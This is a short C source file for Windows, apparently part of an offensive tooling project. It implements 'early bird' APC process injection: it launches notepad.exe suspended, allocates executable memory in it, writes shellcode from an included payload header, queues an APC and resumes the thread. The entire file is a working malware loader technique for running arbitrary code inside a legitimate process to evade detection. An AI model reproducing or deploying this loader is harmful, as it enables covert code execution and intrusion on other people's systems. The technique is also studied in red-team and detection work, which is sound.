#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Create target process suspended before any code runs (early bird)
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    // Allocate memory in remote process
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Write shellcode
    if (!WriteProcessMemory(pi.hProcess, pRemoteCode, payload, payload_len, NULL)) {
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Queue APC to main thread before initialization completes
    if (!QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Resume thread to trigger APC delivery
    ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hThread, 3000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
